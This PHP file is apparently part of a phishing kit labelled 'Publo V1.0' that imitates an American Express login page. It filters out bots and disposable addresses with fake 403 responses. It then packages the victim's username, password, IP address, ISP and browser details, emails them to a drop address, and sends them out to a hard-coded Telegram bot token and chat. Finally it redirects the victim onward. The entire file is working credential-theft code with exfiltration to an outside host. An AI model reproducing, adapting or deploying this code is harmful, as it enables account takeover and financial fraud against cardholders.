<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
// require_once("../blocker2.php");
$randomnumber = rand(1, 100);

$ip = getUserIP();
if(strlen($_POST['emailLogin']) < 6) {
  tulis_file("../security/onetime.dat","$ip");
header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if(strlen($_POST['passwordLogin']) < 3) {
  tulis_file("../security/onetime.dat","$ip");
header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['emailLogin'] == "") {
  tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['passwordLogin'] == "") {
  tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
 if(preg_match("/mailinator|yatdew.com|mteen.net|tf-info.com|theaccessuk.org|fuds.net|fuck/", $_POST['emailLogin'])){
  tulis_file("../security/onetime.dat","$ip");
             header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$ispuser = getisp($ip);
$message  = "++++++++++++++++++++++++[ Publo V1.0 ]+++++++++++++++++++++++++++\n";
$message .= "+--------------------------[ AMEX LOGIN ]-------------------------+\n";
$message .= "# USERNAME        : ".$_POST['emailLogin']."\n";
$message .= "# PASSWORD   : ".$_POST['passwordLogin']."\n";
$message .= "+--------------------------[ PC INFORMATION ]-------------------------+\n";
$message .= "# IP ADDRESS     : ".$ip."\n";
$message .= "# ISP                    : ".$ispuser."\n";
$message .= "# REGION            : ".$regioncity."\n";
$message .= "# CITY                 : ".$citykota."\n";
$message .= "# CONTINENT      : ".$continent."\n";
$message .= "# TIMEZONE        : ".$timezone."\n";
$message .= "# DATE                : ".$date."\n";
$message .= "# USER AGENT    : ".$user_agent."\n";
$message .= "++++++++++++++++++++++++[ Publo V1.0 ]+++++++++++++++++++++++++++\n";
$_SESSION['password'] = $_POST['passwordLogin'];
$headers = "From: AMEX LOGIN  <ppCC-$randomnumber@PubloAMEX.team>";
$to = $config['email_result'];
if($config['send_login'] == 'ON') {
  $subject = "💟 ".strtoupper($_POST['emailLogin'])." // $os - $ip - $cn";
  mail($to, $subject, $message, $headers);
}
  tulis_file("../result/total_login.txt", $ip);
echo "<script type='text/javascript'>window.top.location='../ap/auth?session=$key';</script>";
$apiToken = "2121890488:AAEsxO6295XBL6uvfJLa_pefweuxtnFuYCI";
$amex = [
	    'chat_id' => '-1001777869001',
	    'text' => $message
	];	

    $key = substr(sha1(mt_rand()),1,25);
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($amex) );

    exit();
?>
